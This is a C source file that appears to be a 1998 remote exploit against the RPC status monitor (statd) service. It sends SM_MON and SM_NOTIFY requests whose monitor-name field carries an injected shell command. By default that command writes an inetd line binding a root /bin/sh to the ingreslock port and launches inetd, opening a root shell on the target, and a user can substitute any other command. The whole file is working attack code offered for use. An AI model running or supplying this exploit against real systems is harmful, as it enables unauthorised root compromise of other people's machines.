/* 
   Developed by some guys who don't want to goto jail when WIPO passes. :) */

/* Bug fixed on Aug 16 16:28:30 GMT 1998. */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <rpcsvc/sm_inter.h>

void 
usage(char *s) 
{
  printf ("Cache name is the hostname of the remote system.\n");
  printf ("For example, blue.net, might be either blue or blue.net.\n\n");
  printf ("Usage: %s hostname <cachename> <command>\n", s);
  exit (0);
}

int
main (int argc, char *argv[]) 
{
  CLIENT *cl;
  enum clnt_stat stat;
  struct timeval tm;
  struct mon monreq;
  struct sm_stat_res monres;
  struct stat_chge ntf_arg;
  struct hostent *hp;
  struct sockaddr_in target;
  int sd;
 
  char attack[1024];

  if (argc < 3)
    usage(argv[0]);

  if (argc==4)
  	sprintf(attack, ";%s", argv[3]);
  else
	sprintf(attack, "; echo \"ingreslock stream tcp nowait root /bin/sh sh -i\" >>/tmp/bob ; /usr/sbin/inetd -s /tmp/bob &");
 
  memset(&monreq, 0, sizeof(monreq));

  monreq.mon_id.my_id.my_name = argv[2];		
  monreq.mon_id.my_id.my_prog = (unsigned long) 100099; 
  monreq.mon_id.my_id.my_vers = (unsigned long) 1;
  monreq.mon_id.my_id.my_proc = (unsigned long) 1;	
  monreq.mon_id.mon_name = attack;	
  monreq.priv[0] = '/';		

  memset(&ntf_arg, 0, sizeof(ntf_arg));

  ntf_arg.mon_name = attack;			
  ntf_arg.state = 1;					

  if ((hp = gethostbyname (argv[1])) == NULL) 
  {
    printf ("Couldnt resolve %s!\n", argv[1]);
    exit (-1);
  }

  target.sin_family = AF_INET;
  target.sin_addr.s_addr = *(u_long *)hp->h_addr;
  target.sin_port = 0;
  sd = RPC_ANYSOCK;

  tm.tv_sec = 10;
  tm.tv_usec = 0;

  if ((cl = clntudp_create(&target, SM_PROG, SM_VERS, tm, &sd)) == NULL) 
  {
    clnt_pcreateerror("clnt_create");
    exit (-1);
  }

  stat = clnt_call(cl, SM_MON, xdr_mon, (char *)&monreq, xdr_sm_stat_res,
    (char *)&monres, tm);

  if (stat != RPC_SUCCESS)
    clnt_perror(cl, "clnt_call"); 
  else 
    printf("stat_res = %d.\n", monres.res_stat);

  stat=clnt_call(cl, SM_NOTIFY, xdr_stat_chge, (char *)&ntf_arg, xdr_void,
    NULL, tm);

  if (stat != RPC_SUCCESS)
    clnt_perror(cl, "clnt_call");

  clnt_destroy(cl);
  exit (0);
}

